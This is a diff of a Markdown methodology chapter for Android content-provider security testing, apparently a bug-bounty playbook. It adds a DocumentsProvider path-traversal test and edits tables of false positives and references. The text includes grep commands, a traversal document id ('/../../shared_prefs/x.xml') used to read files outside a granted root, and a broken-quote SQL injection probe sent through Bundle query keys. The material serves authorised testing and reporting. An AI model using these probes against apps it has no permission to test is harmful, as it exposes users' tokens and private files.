+grep -rnE 'QUERY_ARG_SQL_(GROUP_BY|HAVING|LIMIT|SELECTION)|public Cursor query\(Uri [a-z]+, String\[\] [a-z]+, Bundle|public int (update|delete)\(Uri [a-z]+, (ContentValues [a-z]+, )?Bundle' "$DEC/jadx/sources"
+```
+  From the probe app (add the verb to the shared probe if it is missing: a `Bundle` with one key per run,
+  starting with `QUERY_ARG_SQL_LIMIT` and `QUERY_ARG_SQL_GROUP_BY` set to a syntactically broken value
+  such as a lone single quote), against the seeded dataset from D07-049, then the same key with a valid
+  value — the pair is the oracle.
+- **Proof:** A parser error naming `GROUP BY`/`HAVING`/`LIMIT`, or a boolean row-count differential driven
+  only through a Bundle key, on a seeded dataset (D07-049) — recorded with the exact key and value.
+- **Escalation:** D07-038 (extraction through the error channel); D07-042 (the blind oracle through the
+  write overloads); D07-043 when `setStrict(true)` is on but the subquery form survives.
+- **Ruled out when:** No Bundle-form override exists (grep empty, file list recorded), or every key is routed
+  through `SQLiteQueryBuilder` with `setStrictGrammar(true)` and the probe throws `Invalid token` — proved
+  with the D07-044 negative control, not by reading the builder.
+
+### D07-080 · The app's own `DocumentsProvider` — document ids that escape the picked root
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `server_side_injection.file_inclusion.local` (P1) where bytes are read; `broken_access_control.exposed_sensitive_android_intent` (varies) otherwise |
+| **Attacker** | AM-04 (the user picks the app's root once in the system picker) |
+| **Applies to** | apps with a class extending `DocumentsProvider` (a cloud-storage, notes or file-manager feature exposed to the Storage Access Framework) |
+| **Requires** | provider, device |
+| **Maps to** | MASTG-TECH-0159; `guide/topics/providers/create-document-provider` (`isChildDocument`, `MANAGE_DOCUMENTS`) |
+| **Record** | logs/D07-080.txt; screenshots/D07-080-1.png (the picker grant) |
+
+- **Skip when:** `grep -rl 'extends DocumentsProvider' "$DEC/jadx/sources"` is empty → notes: "no DocumentsProvider subclass; the SAF consumer side is D07-064".
+- **Test:** The provider must be exported with `android.permission.MANAGE_DOCUMENTS`, so only the system
+  picker calls it directly — but any app can send `ACTION_OPEN_DOCUMENT_TREE`, and once the user picks the
+  app's root the caller holds a tree grant and can mint any document URI under it with
+  `DocumentsContract.buildDocumentUriUsingTree(tree, id)`. `openDocument(documentId, ...)` and
+  `queryChildDocuments(parentId, ...)` receive that id; if ids are filesystem paths (or encode one) and
+  `isChildDocument(parentId, childId)` is absent or compares string prefixes, an id carrying `..` resolves
+  outside the picked root. D07-064 is the consumer side of SAF; this is the server side.
+- **How:**
+```bash
+grep -rnE 'extends DocumentsProvider|openDocument\(|queryChildDocuments\(|isChildDocument\(|getDocIdForFile|getFileForDocId' "$DEC/jadx/sources" -A10
+```
+  Obtain the tree grant through the picker in a stub that sends `ACTION_OPEN_DOCUMENT_TREE` and persists the
+  returned tree URI; then open `buildDocumentUriUsingTree(tree, <rootId> + "/../../shared_prefs/x.xml")`
+  with `openInputStream` and log the first bytes, and `queryChildDocuments` on a parent id outside the root.
+- **Proof:** Bytes from outside the picked root returned under a tree grant, plus the decompiled
+  `isChildDocument` (or its absence) at file:line.
+- **Escalation:** The D07-028 impact set (token files, databases); `"w"` mode -> D07-035 -> D17.
+- **Ruled out when:** `isChildDocument` canonicalises both ids (file:line) and the probe throws
+  `SecurityException: Document ... is not a child of ...` for the traversal id.
 
 ## Graveyard for this domain
 
@@ -2864,7 +3099,7 @@ These primitives have independent fix surfaces and are filed separately per the 
 | `grantUriPermissions="true"` on a `FileProvider` | Mandatory for the class — without it the provider throws `SecurityException: Provider must grant uri permissions` | The **path scope** is over-broad (D07-057) or a grant reaches an attacker (D07-024/-022) |
 | `<root-path>` present, provider not exported, no grant path, no URI sink in the app | A configuration observation with no reachable caller; it is a blast-radius multiplier waiting for a primitive | Any of: the provider is exported, a redirector issues grants (D08), or the app opens attacker URIs (D07-056) |
 | Sensitive data found in `/data/data/<pkg>` via `run-as` or root | AM-12 is not an attack, and the VRT prices it at P5 (`insecure_data_storage...on_internal_storage`). Xiaomi, Grab and Spotify all list app-private storage explicitly out of scope; Google: "Access to non-sensitive internal files of another app also does not qualify" | Pair it with a provider read, traversal or grant that a non-root third party can use, and refile as the **access** bug with the data as the payload |
-| `adb shell content query` returns rows but the same query from a PoC app throws `SecurityException` | `shell` is uid 2000 and holds permissions no third-party app has | Reproduce from an app UID (D07-007). If it only works from `shell`, it is an artefact |
+| `adb -s "$SERIAL" shell content query` returns rows but the same query from a PoC app throws `SecurityException` | `shell` is uid 2000 and holds permissions no third-party app has | Reproduce from an app UID (D07-007). If it only works from `shell`, it is an artefact |
 | drozer `scanner.provider.traversal` / `scanner.provider.injection` reporting "Not Vulnerable" | One payload against one file, and a single-error-string oracle respectively | The manual matrix (D07-032) or the `1=1`/`1=0` body diff (D07-049) plus a source-level check |
 | `/etc/hosts` canary failing | Some OEM SELinux policies block it outright; the scanner's only oracle silently reads empty | Re-run with `/proc/version`, which is readable on API 30+, and state the policy caveat |
 | A provider crash from a malformed URI or a null extra | VRT `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**, and it is a self-inflicted local crash | The crash is a memory-safety primitive in native provider code, or it is persistent (crash-on-launch) — then it is a D19/D04 finding, not D07 |
@@ -2921,7 +3156,7 @@ These primitives have independent fix surfaces and are filed separately per the 
   MASTG-TECH-0148, -0159, -0163; MASTG-KNOW-0042, -0117, -0138; MASTG-TOOL-0004, -0015, -0110;
   MASWE-0002, -0018, -0036, -0050; rules `mastg-android-content-provider-exported.yml`,
   `mastg-android-fileprovider-broad-scope.yml`, `mastg-android-sql-injection-contentprovider.yml`.
-  Identifiers cross-checked against `data/mastg-android-tests.csv`, `-techniques.csv`, `-rules.csv`.
+  Identifiers cross-checked against `data/standards-index.csv` (`data/mastg-tests.csv`, `data/mastg-techniques.csv`, `data/mastg-rules.csv`).
 - **Android platform documentation** — `guide/topics/manifest/provider-element` (`readPermission`,
   `writePermission`, `grantUriPermissions`, `<path-permission>`, `<grant-uri-permission>`);
   `guide/topics/providers/content-provider-creating`; `guide/components/intents-filters` (the data-test
@@ -2930,7 +3165,7 @@ These primitives have independent fix surfaces and are filed separately per the 
   `training/data-storage/shared/photopicker`; `guide/slices/getting-started`; `topic/libraries/app-startup`;
   `reference/android/app/DownloadManager`; AOSP `ContentProvider.java` javadoc for
   `getCallingPackage()`/`getCallingPackageUnchecked()`; AndroidX `FileProvider.java` (`TAG_ROOT_PATH`).
-- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`, 581 entries) for every priority quoted,
+- **Bugcrowd VRT release 2026-07-08** (`data/vrt.csv`, 581 entries) for every priority quoted,
   including the P5 pinning of the entire mobile branch and the P1 nodes this chapter routes findings into.
 - **Google Mobile VRP and vendor programme rules** — the "Theft of sensitive data" and "Private data
   overwrite due to path traversal" classes, the arbitrary-file-write-must-demonstrate-ACE rule, and the
@@ -2966,4 +3201,4 @@ These primitives have independent fix surfaces and are filed separately per the 
   mobile-to-backend bridge (D07-070), evidence hygiene and the five-screenshot pattern (D07-074), the
   pre-severity gate and retraction discipline (D07-075), and chain-filing order (D07-076).
 - **MITRE ATT&CK Mobile** — T1409 Stored Application Data, T1533 Data from Local System, T1636 Protected
-  User Data (.001–.005), T1641 Data Manipulation, verified against `data/mitre-attack-mobile-android.csv`.
+  User Data (.001–.005), T1641 Data Manipulation, verified against `data/attack-mobile-android.csv`.
